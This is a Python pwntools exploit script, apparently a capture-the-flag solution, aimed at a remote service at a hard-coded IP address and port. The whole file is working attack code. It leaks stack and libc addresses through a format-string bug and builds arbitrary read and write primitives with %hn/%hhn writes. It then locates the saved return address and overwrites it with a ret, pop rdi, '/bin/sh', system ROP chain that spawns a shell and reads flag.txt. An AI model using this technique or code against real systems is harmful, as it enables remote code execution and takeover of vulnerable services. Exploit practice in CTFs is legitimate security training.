#!/usr/bin/env python3
from pwn import *

PORT = 46413
HOST = "144.79.188.39"

p = remote(HOST, PORT)

## Setup function

def sla(pr, dt):
    p.sendlineafter(pr, dt)

def leak_lld(idx, show=True):
    sla(b"> ", f"%{idx}$lld".encode())
    data = p.recvline().strip()
    val = int(data)
    if show:
        log.info(f"%{idx}$lld -> {val:#x}")
    return val

def send_and_get(payload, timeout=2):
    p.sendline(payload)
    data = b""
    try:
        data = p.recvuntil(b"\n> ", timeout=timeout)
    except EOFError:
        data += p.recvrepeat(0.2)
    return data

def parse_body(out):
    if b"\n> " in out:
        return out.rsplit(b"\n> ", 1)[0]
    return out

def write_via_slot(slot, value, size="hn"):
    if size == "n":
        payload = f"%{value}d%{slot}$n".encode() if value else f"%{slot}$n".encode()
    elif size == "hn":
        payload = f"%{value}d%{slot}$hn".encode() if value else f"%{slot}$hn".encode()
    elif size == "hhn":
        payload = f"%{value}d%{slot}$hhn".encode() if value else f"%{slot}$hhn".encode()
    else:
        raise ValueError(size)
    timeout = 8 if value >= 0x1000 else 3
    return send_and_get(payload, timeout=timeout)

current_slot20 = None
current_slot30 = None

def set_slot30_to_stack_addr(stack_addr):
    global current_slot30
    if current_slot30 == stack_addr:
        return
    write_via_slot(10, stack_addr & 0xFFFF, "hn")
    current_slot30 = stack_addr

def set_slot20_ptr(target_addr):
    global current_slot20
    if current_slot20 == target_addr:
        return
    for off in (0, 2, 4):
        cur = 0 if current_slot20 is None else ((current_slot20 >> (8 * off)) & 0xFFFF)
        new = (target_addr >> (8 * off)) & 0xFFFF
        if cur != new:
            set_slot30_to_stack_addr(slot12 + off)
            write_via_slot(30, new, "hn")
    current_slot20 = target_addr

def arb_read_cstr(addr):
    set_slot20_ptr(addr)
    out = send_and_get(b"%20$s")
    return parse_body(out)

def arb_read(addr, size):
    out = bytearray()
    cur = addr
    while len(out) < size:
        chunk = arb_read_cstr(cur)
        if not chunk:
            out.append(0)
            cur += 1
            continue
        need = size - len(out)
        take = chunk[:need]
        out.extend(take)
        cur += len(take)
        if len(out) < size and len(take) == len(chunk):
            out.append(0)
            cur += 1
    return bytes(out)

def arb_read_u64(addr):
    return u64(arb_read(addr, 8))

def arb_write8(addr, value):
    set_slot20_ptr(addr)
    write_via_slot(20, value & 0xFF, "hhn")

def arb_write16(addr, value):
    set_slot20_ptr(addr)
    write_via_slot(20, value & 0xFFFF, "hn")

def arb_write(addr, data):
    for i, b in enumerate(data):
        arb_write8(addr + i, b)

def arb_write_u64(addr, value):
    for off in (0, 2, 4, 6):
        arb_write16(addr + off, (value >> (8 * off)) & 0xFFFF)

def find_rbp_rip():
    stacks = [
        leak_lld(10),
        leak_lld(12),
        leak_lld(30),
        leak_lld(13),
        leak_lld(16),
        leak_lld(28),
        leak_lld(32),
        leak_lld(34),
        leak_lld(39),
        leak_lld(44),
    ]
    lo = min(stacks) - 0x80
    hi = max(stacks) + 0x120
    log.info(f"scan stack range: {lo:#x} -> {hi:#x}")
    for addr in range(lo, hi, 8):
        saved_rbp = arb_read_u64(addr)
        saved_rip = arb_read_u64(addr + 8)
        if (0x00007FF000000000 <= saved_rbp <= 0x00007FFFFFFFFFFF
            and addr < saved_rbp < hi + 0x400
            and saved_rip == slot11):
            log.success(f"main frame @ {addr:#x}")
            log.info(f"saved_rbp: {saved_rbp:#x}")
            log.info(f"saved_rbp_slot: {addr:#x}")
            log.info(f"saved_rip slot: {addr + 8:#x}")
            return addr
    raise RuntimeError("failed to locate main frame")

## Exploitation

slot10 = leak_lld(10)
slot11 = leak_lld(11)
slot12 = leak_lld(12)
slot20 = leak_lld(20)
slot30 = leak_lld(30)

main_frame = find_rbp_rip()
saved_rip = main_frame + 8

libc_base = slot11 - 0x2A1CA
log.info(f'libc_base: {hex(libc_base)}')

pop_rdi = libc_base + 0x10c08d
ret = pop_rdi + 1
bin_sh = libc_base + 0x1cb42f
system = libc_base + 0x58750

arb_write_u64(saved_rip + 0x00, ret)
arb_write_u64(saved_rip + 0x08, pop_rdi)
arb_write_u64(saved_rip + 0x10, bin_sh)
arb_write_u64(saved_rip + 0x18, system)

p.sendline(b"quit")
p.sendline(b'cat flag.txt')
p.interactive()
